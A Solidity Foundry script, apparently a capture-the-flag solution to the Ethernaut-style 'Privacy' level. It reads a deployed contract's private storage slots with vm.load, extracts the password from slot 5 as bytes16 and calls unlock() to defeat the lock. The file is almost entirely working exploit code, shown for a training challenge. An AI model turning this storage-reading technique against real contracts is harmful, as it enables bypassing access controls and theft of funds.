pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Challenge/Privacy.sol";
import "../lib/forge-std/src/console.sol";
import "../src/utils/BytesLib.sol";

contract PrivacyCracker is Script {
    Privacy privacy = Privacy(0x5D5322c5Dca3ebAb672988000CcAF9093e5e0d58);

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        bytes32 lockedBytes = vm.load(
            0x5D5322c5Dca3ebAb672988000CcAF9093e5e0d58,
            0
        );
        console.log("locked:");
        console.logBytes32(lockedBytes);
        bytes32 IDBytes = vm.load(
            0x5D5322c5Dca3ebAb672988000CcAF9093e5e0d58,
            bytes32(uint256(1))
        );
        console.log("ID:");
        console.log(uint256(IDBytes));
        bytes32 flatteningBytes = vm.load(
            0x5D5322c5Dca3ebAb672988000CcAF9093e5e0d58,
            bytes32(uint256(2))
        );
        // console.log("flattening:");
        // bytes memory flattended = bytesToBytes32(flatteningBytes);
        // console.log(BytesLib.toUint8(flattended, 0));
        // bytes32 denominationBytes = vm.load(
        //     0x5D5322c5Dca3ebAb672988000CcAF9093e5e0d58,
        //     bytes32(uint256(3))
        // );
        // console.log("denomination:");
        // console.log(uint256(denominationBytes));

        bytes32 awkwardnessBytes = vm.load(
            0x5D5322c5Dca3ebAb672988000CcAF9093e5e0d58,
            bytes32(uint256(5))
        );
        console.log("awkwardness:");
        console.logBytes32(awkwardnessBytes);
        bytes16 password = bytes16(awkwardnessBytes);
        console.logBytes16(password);
        privacy.unlock(password);
        bool lockedAfter = privacy.locked();
        console.log("lockedAfter:");
        console.log(lockedAfter);
        vm.stopBroadcast();
    }
}

// bool public locked = true;
// uint256 public ID = block.timestamp;
// uint8 private flattening = 10;
// uint8 private denomination = 255;
// uint16 private awkwardness = uint16(block.timestamp);
// bytes32[3] private data;
